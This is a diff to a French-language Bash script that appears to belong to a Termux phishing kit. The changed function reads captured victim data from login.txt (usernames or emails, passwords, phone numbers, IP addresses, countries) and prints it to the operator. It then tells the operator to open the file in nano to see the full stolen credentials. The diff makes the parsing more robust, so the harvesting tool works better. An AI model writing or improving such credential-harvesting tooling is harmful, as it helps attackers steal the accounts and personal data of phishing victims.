@@ -30,24 +30,29 @@ animation() {
 
 # Fonction pour afficher les données de connexion
 afficher_donnees() {
-    echo -e "\n${CYAN}\n\n═════════ CONNEXION DÉTECTÉE ═════════${NC}"
-    while IFS= read -r ligne; do
-        if [[ "$ligne" == *"Username:"* ]]; then
-            echo -e "${VERT}✉️  E-mail/Numéro: ${MAGENTA}${ligne#*: }${NC}"
-        elif [[ "$ligne" == *"Password:"* ]]; then
-            echo -e "${VERT}🔑 Mot de passe: ${ROUGE}${ligne#*: }${NC}"
-        elif [[ "$ligne" == *"Phone:"* ]]; then
-            echo -e "${VERT}📞 ID du compte : ${BLEU}${ligne#*: }${NC}"
-        elif [[ "$ligne" == *"IP:"* ]]; then
-            echo -e "${VERT}🌐 Adresse IP: ${JAUNE}${ligne#*: }${NC}"
-        elif [[ "$ligne" == *"Country:"* ]]; then
-            echo -e "${VERT}🌍 Pays: ${CYAN}${ligne#*: }${NC}"
-        fi
-    done < login.txt
-    echo -e "${CYAN}════════════════════════════════════${NC}"
-    echo -e "${ROUGE}🚨 ATTENTION: Ouvrez une nouvelle session Termux"
-    echo -e "et tapez ${VERT}nano login.txt${ROUGE} pour voir les identifiants complets 🚨${NC}"
-    echo -e "${CYAN}════════════════════════════════════${NC}\n"
+    echo -e "\n${CYAN}\n\n═════════ CONNEXION DÉTECTÉE ═══ ${NC}"
+while IFS= read -r ligne || [[ -n "$ligne" ]]; do
+    ligne_clean=$(echo "$ligne" | tr -d '\r')  # Supprimer les \r invisibles
+    case "$ligne_clean" in
+        *[Uu]sername:*)
+            echo -e "${VERT}✉️ E-mail/Numéro: ${NC}${ligne_clean#*: }"
+            ;;
+        *[Pp]assword:*|*[Mm]ot\ de\ passe:*)
+            echo -e "${VERT}🔑 Mot de passe: ${NC}${ligne_clean#*: }"
+            ;;
+        *[Pp]hone:*)
+            echo -e "${VERT}📞 Téléphone: ${NC}${ligne_clean#*: }"
+            ;;
+        *[Ii][Pp]:*)
+            echo -e "${VERT}🌐 Adresse IP: ${NC}${ligne_clean#*: }"
+            ;;
+        *[Cc]ountry:*)
+            echo -e "${VERT}🌍 Pays: ${NC}${ligne_clean#*: }"
+            ;;
+    esac
+done < login.txt
+
+echo -e "${CYAN}═🚨🚨 Ouvrez une autre page\net TAPEZ nano login.txt\npour voir les identifiants 🚨${NC}\n"
 }
 
 # Fonction pour surveiller et afficher les données PHP en temps réel
